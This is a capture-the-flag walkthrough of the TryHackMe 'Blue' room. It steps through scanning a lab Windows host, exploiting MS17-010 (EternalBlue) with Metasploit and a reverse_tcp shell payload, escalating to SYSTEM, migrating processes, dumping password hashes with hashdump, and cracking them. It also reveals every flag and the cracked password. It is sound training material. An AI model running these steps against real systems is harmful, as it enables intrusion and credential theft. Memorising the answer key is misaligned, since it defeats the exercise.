---
description: >-
  Deploy & hack into a Windows machine, leveraging common misconfigurations
  issues.
---

# 🪟 Blue

{% embed url="https://tryhackme.com/room/blue" %}
[https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)
{% endembed %}

| Room Attributes       | Value                                                                   |
| --------------------- | ----------------------------------------------------------------------- |
| Subscription Required |  <mark style="color:green;background-color:green;">False</mark> \[Free] |
| Type                  | Walkthroughs                                                            |
| Difficulty            |  <mark style="color:orange;background-color:yellow;">Medium</mark>      |
| Tags                  | Windows, Eternal Blue, MS17-010, CVE2017-0144                           |

## Task 1 Recon

### Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

{% hint style="warning" %}
**HINT:** `Command: nmap -sV -vv --script vuln TARGET_IP`
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### How many ports are open with a port number under 1000?

{% hint style="warning" %}
**HINT:** Near the top of the nmap output: PORT STATE SERVICE
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`3`

</details>

### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

{% hint style="warning" %}
**HINT:** Revealed by the ShadowBrokers, exploits an issue within SMBv1
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`ms17-010`

</details>



## Task 2 Gain Access

### Start [Metasploit](https://tryhackme.com/room/rpmetasploit)

{% hint style="warning" %}
**HINT:** Command: msfconsole
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

{% hint style="warning" %}
**HINT:** search ms??
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`exploit/windows/smb/ms17_010_eternalblue`

</details>

### Show options and set the one required value. What is the name of this value? (All caps for submission)

{% hint style="warning" %}
**HINT:** Command: show options
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`RHOSTS`

</details>

### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp` With that done, run the exploit!

{% hint style="warning" %}
**HINT:** Command: run (or exploit)
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.&#x20;

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 3 Escalate

### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)&#x20;

{% hint style="warning" %}
**HINT:** Google this: shell\_to\_meterpreter
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`post/multi/manage/shell_to_meterpreter`

</details>

### Select this (use MODULE\_PATH). Show options, what option are we required to change?

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`SESSION`

</details>

### Set the required option, you may need to list all of the sessions to find your target here.&#x20;

{% hint style="warning" %}
**HINT:** sessions -l
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### Run! If this doesn't work, try completing the exploit from the previous task once more.

{% hint style="warning" %}
**HINT:** Command: run (or exploit)
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### Once the meterpreter shell conversion completes, select that session for use.

{% hint style="warning" %}
**HINT:** sessions SESSION\_NUMBER
{% endhint %}

{% hint style="success" %}
No answer needed
{% endhint %}

### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.&#x20;

{% hint style="success" %}
No answer needed
{% endhint %}

### List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

{% hint style="success" %}
No answer needed
{% endhint %}

### Migrate to this process using the 'migrate PROCESS\_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.&#x20;

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 4 Cracking

### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?&#x20;

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`Jon`

</details>

### Copy this password hash to a file and research how to crack it. What is the cracked password?

{% hint style="warning" %}
**HINT:** This password can be found within the rockyou.txt wordlist
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`alqfna22`

</details>

## Task 5 Find flags!

### Flag1? _This flag can be found at the system root._&#x20;

{% hint style="warning" %}
**HINT:** Can you C it?
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:flag{access\_the\_machine}

</details>

### Flag2? _This flag can be found at the location where passwords are stored within Windows._&#x20;

\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.&#x20;

{% hint style="warning" %}
**HINT:** I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`flag{sam_database_elevated_access}`

</details>

flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._&#x20;

{% hint style="warning" %}
**HINT:** You'll need to have elevated privileges to access this flag.
{% endhint %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`flag{admin_documents_can_be_valuable}`

</details>

